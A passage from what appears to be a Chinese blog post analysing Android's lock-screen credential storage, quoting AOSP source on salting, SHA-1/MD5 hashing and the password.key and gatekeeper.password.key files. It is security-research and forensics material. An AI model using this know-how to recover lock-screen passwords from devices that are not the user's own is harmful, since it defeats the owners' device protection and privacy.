<span class="type">byte</span>[] combined = <span class="keyword">new</span> <span class="title class_">byte</span>[sha1.length + md5.length];</span><br><span class="line"><span class="number">1102</span>              System.arraycopy(sha1, <span class="number">0</span>, combined, <span class="number">0</span>, sha1.length);</span><br><span class="line"><span class="number">1103</span>              System.arraycopy(md5, <span class="number">0</span>, combined, sha1.length, md5.length);</span><br><span class="line"><span class="number">1104</span>  </span><br><span class="line"><span class="number">1105</span>              <span class="keyword">final</span> <span class="type">char</span>[] hexEncoded = HexEncoding.encode(combined);</span><br><span class="line"><span class="number">1106</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(hexEncoded).getBytes(StandardCharsets.UTF_8);</span><br><span class="line"><span class="number">1107</span>          &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line"><span class="number">1108</span>              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Missing digest algorithm: &quot;</span>, e);</span><br><span class="line"><span class="number">1109</span>          &#125;</span><br><span class="line"><span class="number">1110</span>      &#125;</span><br></pre></td></tr></table></figure><p>传入的参数password就是我们输入的数字密码，密码与<code>getSalt(userId)</code>拼接转换为字节数组赋值给saltedPassword。对saltedPassword进行SHA-1和MD5加密，将加密后的结果拼接转换为十六进制的形式。</p><h2 id="2-2-getSalt"><a href="#2-2-getSalt" class="headerlink" title="2.2 getSalt()"></a>2.2 getSalt()</h2><p>看<code>getSalt()</code>的具体实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</span></span><br><span class="line"><span class="number">1067</span>      <span class="keyword">private</span> String <span class="title function_">getSalt</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">1068</span>          <span class="type">long</span> <span class="variable">salt</span> <span class="operator">=</span> getLong(LOCK_PASSWORD_SALT_KEY, <span class="number">0</span>, userId);</span><br><span class="line"><span class="number">1069</span>          <span class="keyword">if</span> (salt == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">1070</span>              <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">1071</span>                  salt = SecureRandom.getInstance(<span class="string">&quot;SHA1PRNG&quot;</span>).nextLong();</span><br><span class="line"><span class="number">1072</span>                  setLong(LOCK_PASSWORD_SALT_KEY, salt, userId);</span><br><span class="line"><span class="number">1073</span>                  Log.v(TAG, <span class="string">&quot;Initialized lock password salt for user: &quot;</span> + userId);</span><br><span class="line"><span class="number">1074</span>              &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line"><span class="number">1075</span>                  <span class="comment">// Throw an exception rather than storing a password we&#x27;ll never be able to recover</span></span><br><span class="line"><span class="number">1076</span>                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Couldn&#x27;t get SecureRandom number&quot;</span>, e);</span><br><span class="line"><span class="number">1077</span>              &#125;</span><br><span class="line"><span class="number">1078</span>          &#125;</span><br><span class="line"><span class="number">1079</span>          <span class="keyword">return</span> Long.toHexString(salt);</span><br><span class="line"><span class="number">1080</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">131</span>      <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">LOCK_PASSWORD_SALT_KEY</span> <span class="operator">=</span> <span class="string">&quot;lockscreen.password_salt&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="2-3-getLong"><a href="#2-3-getLong" class="headerlink" title="2.3 getLong()"></a>2.3 getLong()</h2><p>继续看<code>getLong()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</span></span><br><span class="line"><span class="number">1286</span>      <span class="keyword">private</span> <span class="type">long</span> <span class="title function_">getLong</span><span class="params">(String secureSettingKey, <span class="type">long</span> defaultValue, <span class="type">int</span> userHandle)</span> &#123;</span><br><span class="line"><span class="number">1287</span>          <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">1288</span>              <span class="keyword">return</span> getLockSettings().getLong(secureSettingKey, defaultValue, userHandle);</span><br><span class="line"><span class="number">1289</span>          &#125; <span class="keyword">catch</span> (RemoteException re) &#123;</span><br><span class="line"><span class="number">1290</span>              <span class="keyword">return</span> defaultValue;</span><br><span class="line"><span class="number">1291</span>          &#125;</span><br><span class="line"><span class="number">1292</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">256</span>      <span class="keyword">public</span> ILockSettings <span class="title function_">getLockSettings</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="number">257</span>          <span class="keyword">if</span> (mLockSettingsService == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">258</span>              <span class="type">ILockSettings</span> <span class="variable">service</span> <span class="operator">=</span> ILockSettings.Stub.asInterface(</span><br><span class="line"><span class="number">259</span>                      ServiceManager.getService(<span class="string">&quot;lock_settings&quot;</span>));</span><br><span class="line"><span class="number">260</span>              mLockSettingsService = service;</span><br><span class="line"><span class="number">261</span>          &#125;</span><br><span class="line"><span class="number">262</span>          <span class="keyword">return</span> mLockSettingsService;</span><br><span class="line"><span class="number">263</span>      &#125;</span><br></pre></td></tr></table></figure><p>通过在ServiceManager中获取一个服务来进行操作，在Android中，像这种获取服务的方式最终实现逻辑都是在XXXService类中，这里是<code>LockSettingsService.java</code>类，找到这个类，查看它的<code>getLong()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsService.java</span></span><br><span class="line"><span class="number">929</span>      <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getLong</span><span class="params">(String key, <span class="type">long</span> defaultValue, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">930</span>          checkReadPermission(key, userId);</span><br><span class="line"><span class="number">931</span>          <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> getStringUnchecked(key, <span class="literal">null</span>, userId);</span><br><span class="line"><span class="number">932</span>          <span class="keyword">return</span> TextUtils.isEmpty(value) ? defaultValue : Long.parseLong(value);</span><br><span class="line"><span class="number">933</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">941</span>      <span class="keyword">public</span> String <span class="title function_">getStringUnchecked</span><span class="params">(String key, String defaultValue, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">942</span>          <span class="keyword">if</span> (Settings.Secure.LOCK_PATTERN_ENABLED.equals(key)) &#123;</span><br><span class="line"><span class="number">943</span>              <span class="type">long</span> <span class="variable">ident</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line"><span class="number">944</span>              <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">945</span>                  <span class="keyword">return</span> mLockPatternUtils.isLockPatternEnabled(userId) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="number">946</span>              &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="number">947</span>                  Binder.restoreCallingIdentity(ident);</span><br><span class="line"><span class="number">948</span>              &#125;</span><br><span class="line"><span class="number">949</span>          &#125;</span><br><span class="line"><span class="number">950</span>  </span><br><span class="line"><span class="number">951</span>          <span class="keyword">if</span> (userId == USER_FRP) &#123;</span><br><span class="line"><span class="number">952</span>              <span class="keyword">return</span> getFrpStringUnchecked(key);</span><br><span class="line"><span class="number">953</span>          &#125;</span><br><span class="line"><span class="number">954</span>  </span><br><span class="line"><span class="number">955</span>          <span class="keyword">if</span> (LockPatternUtils.LEGACY_LOCK_PATTERN_ENABLED.equals(key)) &#123;</span><br><span class="line"><span class="number">956</span>              key = Settings.Secure.LOCK_PATTERN_ENABLED;</span><br><span class="line"><span class="number">957</span>          &#125;</span><br><span class="line"><span class="number">958</span>  </span><br><span class="line"><span class="number">959</span>          <span class="keyword">return</span> mStorage.readKeyValue(key, defaultValue, userId);</span><br><span class="line"><span class="number">960</span>      &#125;</span><br></pre></td></tr></table></figure><p>由于我们的key值是<code>lockscreen.password_salt</code>，所以执行<code>mStorage.readKeyValue()</code>。mStorage的数据类型是LockSettingsStorage。</p><h2 id="2-4-readKeyValue"><a href="#2-4-readKeyValue" class="headerlink" title="2.4 readKeyValue()"></a>2.4 readKeyValue()</h2><p>查看这个类的<code>readKeyValue()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">212</span>    <span class="keyword">public</span> String <span class="title function_">readKeyValue</span><span class="params">(String key, String defaultValue, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">213</span>        <span class="type">int</span> version;</span><br><span class="line"><span class="number">214</span>        <span class="keyword">synchronized</span> (mCache) &#123;</span><br><span class="line"><span class="number">215</span>            <span class="keyword">if</span> (mCache.hasKeyValue(key, userId)) &#123;</span><br><span class="line"><span class="number">216</span>                <span class="keyword">return</span> mCache.peekKeyValue(key, defaultValue, userId);</span><br><span class="line"><span class="number">217</span>            &#125;</span><br><span class="line"><span class="number">218</span>            version = mCache.getVersion();</span><br><span class="line"><span class="number">219</span>        &#125;</span><br><span class="line"><span class="number">220</span></span><br><span class="line"><span class="number">221</span>        Cursor cursor;</span><br><span class="line"><span class="number">222</span>        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> DEFAULT;</span><br><span class="line"><span class="number">223</span>        <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> mOpenHelper.getReadableDatabase();</span><br><span class="line"><span class="number">224</span>        <span class="keyword">if</span> ((cursor = db.query(TABLE, COLUMNS_FOR_QUERY,</span><br><span class="line"><span class="number">225</span>                COLUMN_USERID + <span class="string">&quot;=? AND &quot;</span> + COLUMN_KEY + <span class="string">&quot;=?&quot;</span>,</span><br><span class="line"><span class="number">226</span>                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; Integer.toString(userId), key &#125;,</span><br><span class="line"><span class="number">227</span>                <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>)) != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">228</span>            <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line"><span class="number">229</span>                result = cursor.getString(<span class="number">0</span>);</span><br><span class="line"><span class="number">230</span>            &#125;</span><br><span class="line"><span class="number">231</span>            cursor.close();</span><br><span class="line"><span class="number">232</span>        &#125;</span><br><span class="line"><span class="number">233</span>        mCache.putKeyValueIfUnchanged(key, result, userId, version);</span><br><span class="line"><span class="number">234</span>        <span class="type">return</span> <span class="variable">result</span> <span class="operator">=</span>= DEFAULT ? defaultValue : (String) result;</span><br><span class="line"><span class="number">235</span>    &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">60</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;LockSettingsStorage&quot;</span>;</span><br><span class="line"><span class="number">61</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TABLE</span> <span class="operator">=</span> <span class="string">&quot;locksettings&quot;</span>;</span><br><span class="line"><span class="number">62</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">DEBUG</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">64</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COLUMN_KEY</span> <span class="operator">=</span> <span class="string">&quot;name&quot;</span>;</span><br><span class="line"><span class="number">65</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COLUMN_USERID</span> <span class="operator">=</span> <span class="string">&quot;user&quot;</span>;</span><br><span class="line"><span class="number">66</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COLUMN_VALUE</span> <span class="operator">=</span> <span class="string">&quot;value&quot;</span>;</span><br><span class="line"><span class="number">67</span></span><br><span class="line"><span class="number">68</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] COLUMNS_FOR_QUERY = &#123;</span><br><span class="line"><span class="number">69</span>            COLUMN_VALUE</span><br><span class="line"><span class="number">70</span>    &#125;;</span><br><span class="line"><span class="number">71</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] COLUMNS_FOR_PREFETCH = &#123;</span><br><span class="line"><span class="number">72</span>            COLUMN_KEY, COLUMN_VALUE</span><br><span class="line"><span class="number">73</span>    &#125;;</span><br></pre></td></tr></table></figure><p>从数据库中取出符合条件的第一条记录，即userId为0，key为<code>lockscreen.password_salt</code>的一条记录。</p><img src="/posts/ecd6d008/1.2.3.png" class=""><p>层层回调，这个value从字符串转换成了长整型，回调到<code>getSalt()</code>中，再将这个值转换为十六进制字符串的形式。最后再进行加密操作。</p><h2 id="2-5-readPasswordHashIfExists"><a href="#2-5-readPasswordHashIfExists" class="headerlink" title="2.5 readPasswordHashIfExists()"></a>2.5 readPasswordHashIfExists()</h2><p>现在要找哪里调用了<code>passwordToHash()</code>，同样是在<code>verifyCredential()</code>中被调用的，设置的password也是用storedHash存储。跟手势密码一样来到<code>readCredentialHash()</code>。不过数字密码调用的是<code>readPasswordHashIfExists()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">265</span>    <span class="keyword">private</span> CredentialHash <span class="title function_">readPasswordHashIfExists</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">266</span>        <span class="type">byte</span>[] stored = readFile(getLockPasswordFilename(userId));</span><br><span class="line"><span class="number">267</span>        <span class="keyword">if</span> (!ArrayUtils.isEmpty(stored)) &#123;</span><br><span class="line"><span class="number">268</span>            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CredentialHash</span>(stored, LockPatternUtils.CREDENTIAL_TYPE_PASSWORD,</span><br><span class="line"><span class="number">269</span>                    CredentialHash.VERSION_GATEKEEPER);</span><br><span class="line"><span class="number">270</span>        &#125;</span><br><span class="line"><span class="number">271</span></span><br><span class="line"><span class="number">272</span>        stored = readFile(getLegacyLockPasswordFilename(userId));</span><br><span class="line"><span class="number">273</span>        <span class="keyword">if</span> (!ArrayUtils.isEmpty(stored)) &#123;</span><br><span class="line"><span class="number">274</span>            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CredentialHash</span>(stored, LockPatternUtils.CREDENTIAL_TYPE_PASSWORD,</span><br><span class="line"><span class="number">275</span>                    CredentialHash.VERSION_LEGACY);</span><br><span class="line"><span class="number">276</span>        &#125;</span><br><span class="line"><span class="number">277</span>        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">278</span>    &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">451</span>    <span class="meta">@VisibleForTesting</span></span><br><span class="line"><span class="number">452</span>    String <span class="title function_">getLockPasswordFilename</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">453</span>        <span class="keyword">return</span> getLockCredentialFilePathForUser(userId, LOCK_PASSWORD_FILE);</span><br><span class="line"><span class="number">454</span>    &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">79</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_PASSWORD_FILE</span> <span class="operator">=</span> <span class="string">&quot;gatekeeper.password.key&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">475</span>    <span class="keyword">private</span> String <span class="title function_">getLockCredentialFilePathForUser</span><span class="params">(<span class="type">int</span> userId, String basename)</span> &#123;</span><br><span class="line"><span class="number">476</span>        <span class="type">String</span> <span class="variable">dataSystemDirectory</span> <span class="operator">=</span> Environment.getDataDirectory().getAbsolutePath() +</span><br><span class="line"><span class="number">477</span>                        SYSTEM_DIRECTORY;</span><br><span class="line"><span class="number">478</span>        <span class="keyword">if</span> (userId == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">479</span>            <span class="comment">// Leave it in the same place for user 0</span></span><br><span class="line">    <span class="comment">// /data/system/gatekeeper.password.key</span></span><br><span class="line"><span class="number">480</span>            <span class="keyword">return</span> dataSystemDirectory + basename;</span><br><span class="line"><span class="number">481</span>        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">482</span>            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(Environment.getUserSystemDirectory(userId), basename).getAbsolutePath();</span><br><span class="line"><span class="number">483</span>        &#125;</span><br><span class="line"><span class="number">484</span>    &#125;</span><br></pre></td></tr></table></figure><p>没有，继续看<code>getLegacyLockPasswordFilename()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">462</span>    String <span class="title function_">getLegacyLockPasswordFilename</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">463</span>        <span class="keyword">return</span> getLockCredentialFilePathForUser(userId, LEGACY_LOCK_PASSWORD_FILE);</span><br><span class="line"><span class="number">464</span>    &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">80</span>    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LEGACY_LOCK_PASSWORD_FILE</span> <span class="operator">=</span> <span class="string">&quot;password.key&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">475</span>    <span class="keyword">private</span> String <span class="title function_">getLockCredentialFilePathForUser</span><span class="params">(<span class="type">int</span> userId, String basename)</span> &#123;</span><br><span class="line"><span class="number">476</span>        <span class="type">String</span> <span class="variable">dataSystemDirectory</span> <span class="operator">=</span> Environment.getDataDirectory().getAbsolutePath() +</span><br><span class="line"><span class="number">477</span>                        SYSTEM_DIRECTORY;</span><br><span class="line"><span class="number">478</span>        <span class="keyword">if</span> (userId == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">479</span>            <span class="comment">// Leave it in the same place for user 0</span></span><br><span class="line">    <span class="comment">// /data/system/password.key</span></span><br><span class="line"><span class="number">480</span>            <span class="keyword">return</span> dataSystemDirectory + basename;</span><br><span class="line"><span class="number">481</span>        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">482</span>            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(Environment.getUserSystemDirectory(userId), basename).getAbsolutePath();</span><br><span class="line"><span class="number">483</span>        &#125;</span><br><span class="line"><span class="number">484</span>    &#125;</span><br></pre></td></tr></table></figure><p>还是没有…算了，我们先假设设置的密码为1234，其它的就将源码照搬过来：</p><img src="/posts/ecd6d008/1.2.1.png" class=""><p>接下来就是验证结果与<code>password.key</code>或<code>gatekeeper.password.key</code>中的值是否相等。</p><p>由于Android 8.1.0中没有这些文件，又Android 5.1的<code>passwordToHash()</code>与Android 8.1.0的源码有出入，这里就不再进行演示了。</p><h1 id="3-手势密码保存算法分析"><a href="#3-手势密码保存算法分析" class="headerlink" title="3. 手势密码保存算法分析"></a>3. 手势密码保存算法分析</h1><h2 id="3-1-saveLockPattern"><a href="#3-1-saveLockPattern" class="headerlink" title="3.1 saveLockPattern()"></a>3.1 saveLockPattern()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</span></span><br><span class="line"><span class="number">658</span>      <span class="comment">/**</span></span><br><span class="line"><span class="comment">659       * Save a lock pattern.</span></span><br><span class="line"><span class="comment">660       * <span class="doctag">@param</span> pattern The new pattern to save.</span></span><br><span class="line"><span class="comment">661       * <span class="doctag">@param</span> userId the user whose pattern is to be saved.</span></span><br><span class="line"><span class="comment">662       */</span></span><br><span class="line"><span class="number">663</span>      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveLockPattern</span><span class="params">(List&lt;LockPatternView.Cell&gt; pattern, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">664</span>          <span class="built_in">this</span>.saveLockPattern(pattern, <span class="literal">null</span>, userId);</span><br><span class="line"><span class="number">665</span>      &#125;</span><br><span class="line"><span class="number">666</span>      <span class="comment">/**</span></span><br><span class="line"><span class="comment">667       * Save a lock pattern.</span></span><br><span class="line"><span class="comment">668       * <span class="doctag">@param</span> pattern The new pattern to save.</span></span><br><span class="line"><span class="comment">669       * <span class="doctag">@param</span> savedPattern The previously saved pattern, converted to String format</span></span><br><span class="line"><span class="comment">670       * <span class="doctag">@param</span> userId the user whose pattern is to be saved.</span></span><br><span class="line"><span class="comment">671       */</span></span><br><span class="line"><span class="number">672</span>      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveLockPattern</span><span class="params">(List&lt;LockPatternView.Cell&gt; pattern, String savedPattern, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">673</span>          <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">674</span>              <span class="keyword">if</span> (pattern == <span class="literal">null</span> || pattern.size() &lt; MIN_LOCK_PATTERN_SIZE) &#123;</span><br><span class="line"><span class="number">675</span>                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;pattern must not be null and at least &quot;</span></span><br><span class="line"><span class="number">676</span>                          + MIN_LOCK_PATTERN_SIZE + <span class="string">&quot; dots long.&quot;</span>);</span><br><span class="line"><span class="number">677</span>              &#125;</span><br><span class="line"><span class="number">678</span>  </span><br><span class="line"><span class="number">679</span>              setLong(PASSWORD_TYPE_KEY, DevicePolicyManager.PASSWORD_QUALITY_SOMETHING, userId);<span class="comment">//在locksettings.db中name字段为[PASSWORD_TYPE_KEY]，则将它的value字段修改为[DevicePolicyManager.PASSWORD_QUALITY_SOMETHING]</span></span><br><span class="line"><span class="number">680</span>              getLockSettings().setLockCredential(patternToString(pattern), CREDENTIAL_TYPE_PATTERN,</span><br><span class="line"><span class="number">681</span>                      savedPattern, DevicePolicyManager.PASSWORD_QUALITY_SOMETHING, userId);</span><br><span class="line"><span class="number">682</span>  </span><br><span class="line"><span class="number">683</span>              <span class="comment">// Update the device encryption password.</span></span><br><span class="line"><span class="number">684</span>              <span class="keyword">if</span> (userId == UserHandle.USER_SYSTEM</span><br><span class="line"><span class="number">685</span>                      &amp;&amp; LockPatternUtils.isDeviceEncryptionEnabled()) &#123;</span><br><span class="line"><span class="number">686</span>                  <span class="keyword">if</span> (!shouldEncryptWithCredentials(<span class="literal">true</span>)) &#123;<span class="comment">//取消密码设置</span></span><br><span class="line"><span class="number">687</span>                      clearEncryptionPassword();</span><br><span class="line"><span class="number">688</span>                  &#125; <span class="keyword">else</span> &#123;<span class="comment">//使用凭据加密</span></span><br><span class="line"><span class="number">689</span>                      <span class="type">String</span> <span class="variable">stringPattern</span> <span class="operator">=</span> patternToString(pattern);</span><br><span class="line"><span class="number">690</span>                      updateEncryptionPassword(StorageManager.CRYPT_TYPE_PATTERN, stringPattern);<span class="comment">//更新加密密码</span></span><br><span class="line"><span class="number">691</span>                  &#125;</span><br><span class="line"><span class="number">692</span>              &#125;</span><br><span class="line"><span class="number">693</span>  </span><br><span class="line"><span class="number">694</span>              reportPatternWasChosen(userId);<span class="comment">//报告图案密码已经被选择</span></span><br><span class="line"><span class="number">695</span>              onAfterChangingPassword(userId);</span><br><span class="line"><span class="number">696</span>          &#125; <span class="keyword">catch</span> (RemoteException re) &#123;</span><br><span class="line"><span class="number">697</span>              Log.e(TAG, <span class="string">&quot;Couldn&#x27;t save lock pattern &quot;</span> + re);</span><br><span class="line"><span class="number">698</span>          &#125;</span><br><span class="line"><span class="number">699</span>      &#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-patternToString"><a href="#3-2-patternToString" class="headerlink" title="3.2 patternToString()"></a>3.2 patternToString()</h2><p><code>patternToString()</code>是1.3的<code>stringToPattern()</code>的逆算法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</span></span><br><span class="line"><span class="number">1012</span>      <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">patternToString</span><span class="params">(List&lt;LockPatternView.Cell&gt; pattern)</span> &#123;</span><br><span class="line"><span class="number">1013</span>          <span class="keyword">if</span> (pattern == <span 